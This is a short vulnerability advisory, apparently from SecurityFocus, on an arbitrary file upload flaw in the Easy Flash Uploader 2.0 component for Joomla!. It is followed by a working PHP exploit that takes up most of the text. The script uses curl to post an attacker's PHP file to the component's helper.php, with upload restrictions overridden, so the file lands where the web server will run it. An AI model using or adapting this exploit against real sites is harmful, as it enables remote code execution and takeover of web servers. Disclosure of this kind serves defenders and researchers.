source: http://www.securityfocus.com/bid/53977/info

The Easy Flash Uploader component for Joomla! is prone to a vulnerability that lets attackers upload arbitrary files because the application fails to adequately sanitize user-supplied input.

An attacker can exploit this vulnerability to upload arbitrary code and run it in the context of the web server process.

Easy Flash Uploader 2.0 is vulnerable; other versions may also be affected. 

<?php

$uploadfile="lo.php";

$ch = 
curl_init("http://www.example.com/plugins/content/efup_files/helper.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
                array('Filedata'=>"@$uploadfile",
                'JPATH_BASE'=>'../../../',
                'filesize'=>'2000',
                'filetypes'=>'*.*',
                'mimetypes'=>"*",
                'destination'=>'./'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";

?>